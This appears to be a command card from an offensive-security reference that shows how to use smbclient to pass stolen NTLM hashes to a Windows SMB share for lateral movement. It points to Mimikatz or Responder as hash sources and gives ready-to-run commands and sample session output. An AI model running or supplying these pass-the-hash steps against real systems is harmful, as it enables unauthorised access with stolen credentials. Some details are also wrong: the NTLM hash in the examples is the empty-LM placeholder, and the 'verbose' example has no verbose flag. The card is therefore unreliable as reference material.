---
type: command
executor: bash
data: >-
  smbclient -U $_USERNAME%$_LM_HASH:$_NTLM_HASH --pw-nt-hash
  //$_TARGET_IP/$_SHARE_NAME
tags:
  - smb
  - lateral-movement
  - pass-the-hash
platforms:
  - Linux
verified: true
validated: true
---

# smbclient-connect-to-smb-share-ntlm

## Command

```bash
smbclient -U $_USERNAME%$_LM_HASH:$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
```

## Description

This command uses smbclient to connect to a remote SMB share on a Windows target, authenticating via NTLM hash (pass-the-hash) rather than a password. It initiates an interactive session for browsing files, useful in lateral movement after obtaining hashes from tools like Mimikatz or Responder.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -U | Specifies username and credential format (username%hash) | Yes |
| $_USERNAME | Target username (e.g., bob) | Yes |
| $_LM_HASH | 32-char LM hash (often duplicated NTLM hash for modern systems) | Yes |
| $_NTLM_HASH | 32-char NTLM password hash | Yes |
| --pw-nt-hash | Flag to use NT hash for authentication | Yes |
| //$_TARGET_IP/$_SHARE_NAME | UNC path to share (e.g., //10.10.10.10/Users) | Yes |
| $_TARGET_IP | IP address of SMB server | Yes |
| $_SHARE_NAME | Name of the share (e.g., C$, IPC$) | Yes |

## Examples

### Basic Usage

```bash
smbclient -U bob%aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee --pw-nt-hash //10.10.10.10/Users
```

### Advanced Usage

Connect with verbose output for debugging:
```bash
smbclient -U bob%aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee --pw-nt-hash -N //10.10.10.10/IPC$ -c 'ls'
```

## Expected Output

Successful connection shows an interactive prompt:
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  D        0  Tue Sep 17 13:19:57 2019
  ..                                 D        0  Tue Sep 17 13:19:57 2019
  Default                           DH        0  Tue Jul 14 03:17:20 2009
  desktop.ini                       A        174  Tue Jul 14 00:41:57 2009
  Public                            D        0  Mon Apr 11 22:24:18 2011
  bob                               D        0  Tue Sep 17 13:20:06 2019

                15728127 blocks of size 4096. 13836018 blocks available
```

Failure (invalid hash): NT_STATUS_LOGON_FAILURE or access denied errors.

## Related

- [[Related Procedure: browse-smb-share-using-ntlm-hash]]
- [[Related Tool: smbclient]]
